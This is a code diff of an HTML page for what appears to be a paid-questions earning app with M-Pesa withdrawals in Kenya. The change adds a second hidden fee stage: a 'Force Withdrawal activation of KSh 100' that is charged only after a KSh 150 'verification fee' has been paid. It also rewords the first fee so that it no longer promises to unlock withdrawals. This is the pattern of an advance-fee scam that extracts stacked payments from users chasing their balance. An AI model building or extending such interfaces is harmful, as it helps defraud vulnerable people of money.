@@ -9,7 +9,6 @@
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
 <link href="https://fonts.googleapis.com/css2?family=Sora:wght@300;400;500;600;700;800&family=JetBrains+Mono:wght@400;500&display=swap" rel="stylesheet" />
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
-
 </head>
 <body>
 
@@ -92,7 +91,7 @@
   </div>
 </div>
 
-<!--  PROFILE SCREEN  -->
+<!-- ════════════════ PROFILE SCREEN ════════════════ -->
 <div class="screen" id="profile-screen">
   <div class="profile-box">
     <div class="profile-header">
@@ -163,7 +162,7 @@
   </div>
 </div>
 
-<!--  MAIN APP  -->
+<!-- ════════════════ MAIN APP ════════════════ -->
 <div class="screen" id="app-screen">
 
   <!-- Mobile Header -->
@@ -248,14 +247,12 @@
         </button>
       </div>
 
-      <div class="activation-banner" id="activation-banner">
+       <div class="activation-banner" id="activation-banner">
         <div class="activation-text">
-          <h3><i class="fas fa-unlock" style="margin-right:6px"></i>Verify Account for Withdrawals
-
-</h3>
-          <p>Pay a one-time verification fee of KSh 150 to unlock M-Pesa withdrawals. Your earnings are safe.</p>
+          <h3 id="activation-banner-title"><i class="fas fa-unlock" style="margin-right:6px"></i>Verify Account for Withdrawals</h3>
+          <p id="activation-banner-desc">Pay a one-time verification fee of KSh 150 to activate your account. Your earnings are safe.</p>
         </div>
-        <button class="btn-activate" onclick="showPanel('withdraw')">Activate Now</button>
+        <button class="btn-activate" id="activation-banner-btn" onclick="showPanel('withdraw')">Activate Now</button>
       </div>
 
       <div class="stats-grid">
@@ -317,7 +314,7 @@
         </div>
         <div id="page-dots" class="page-indicator"></div>
       </div>
-      
+
       <div class="questions-grid" id="questions-grid">
         <div class="empty-state"><div class="spinner"></div></div>
       </div>
@@ -334,10 +331,10 @@
     </div>
 
     <!-- ── WITHDRAW PANEL ── -->
-    <div class="page-panel withdraw-box" id="panel-withdraw">
+   <div class="page-panel withdraw-box" id="panel-withdraw">
       <div class="page-title">Withdraw Earnings</div>
       <div class="page-sub">Receive your earnings directly to M-Pesa.</div>
-
+ 
       <div class="info-card">
         <div class="info-row">
           <span class="label">Current Balance</span>
@@ -349,15 +346,21 @@
         </div>
         <div class="info-row">
           <span class="label">Account Status</span>
-          <span class="value" id="wd-status"><span class="chip gold"><i class="fas fa-lock"></i> Not Activated</span></span>
+          <span class="value" id="wd-status">
+            <span class="chip gold"><i class="fas fa-lock"></i> Not Activated</span>
+          </span>
+        </div>
+        <div class="info-row" id="wd-phone-row" style="display:none">
+          <span class="label">Registered M-Pesa</span>
+          <span class="value" id="wd-reg-phone" style="color:var(--text2);font-size:0.85rem"></span>
         </div>
       </div>
-
-      <!-- Not activated view -->
+ 
+      <!-- Stage 1: Not activated — only this shows by default -->
       <div id="wd-locked">
         <div class="locked-msg">
           <i class="fas fa-exclamation-triangle"></i>
-          <p>Your account needs to be activated before you can withdraw. Pay a one-time fee of <strong>KSh 150</strong> via M-Pesa to unlock withdrawals permanently.</p>
+          <p>Your account needs to be activated before you can withdraw. Pay a one-time fee of <strong>KSh 150</strong> via M-Pesa to unlock your account.</p>
         </div>
         <div class="field-group" style="margin-bottom:16px">
           <label class="field-label">M-Pesa Phone Number</label>
@@ -373,8 +376,25 @@
         </button>
         <p class="auth-note" style="margin-top:12px">One-time payment. No recurring charges.</p>
       </div>
-
-      <!-- Activated view -->
+ 
+      <!-- Stage 2: Activated — force verify. Hidden until activated=true -->
+      <div id="wd-force" class="hidden">
+        <div style="background:rgba(0,166,81,0.08);border:1px solid rgba(0,166,81,0.25);border-radius:var(--radius);padding:16px;margin-bottom:20px;display:flex;align-items:flex-start;gap:12px;">
+          <i class="fas fa-check-circle" style="color:var(--green);margin-top:2px"></i>
+          <div>
+            <div style="font-size:0.88rem;font-weight:700;color:var(--green-light);margin-bottom:3px;">Account Verified</div>
+            <div style="font-size:0.82rem;color:var(--text2);line-height:1.5;">Your KSh 150 verification was successful. To withdraw your earnings, complete the one-time <strong style="color:var(--text)">Force Withdrawal activation of KSh 100</strong>. The M-Pesa prompt will be sent automatically to your registered number.</div>
+          </div>
+        </div>
+        <div class="alert error" id="fv-error"></div>
+        <div class="alert success" id="fv-success"></div>
+        <button class="btn-activate" style="width:100%;padding:14px;font-size:0.95rem;background:linear-gradient(135deg,#3b82f6,#1d4ed8);" id="btn-force-verify" onclick="doForceVerify()">
+          <i class="fas fa-paper-plane" style="margin-right:8px"></i>Force Withdrawal – KSh 100
+        </button>
+        <p class="auth-note" style="margin-top:12px">Prompt sent automatically to your registered number. No number entry needed.</p>
+      </div>
+ 
+      <!-- Stage 3: Fully verified — withdrawal form. Hidden until forceVerified=true -->
       <div id="wd-unlocked" class="hidden">
         <div class="field-group" style="margin-bottom:16px">
           <label class="field-label">M-Pesa Phone Number</label>
@@ -398,7 +418,6 @@
         </button>
       </div>
     </div>
-
     <!-- ── TRANSACTIONS PANEL ── -->
     <div class="page-panel" id="panel-transactions">
       <div class="page-title">Transaction History</div>
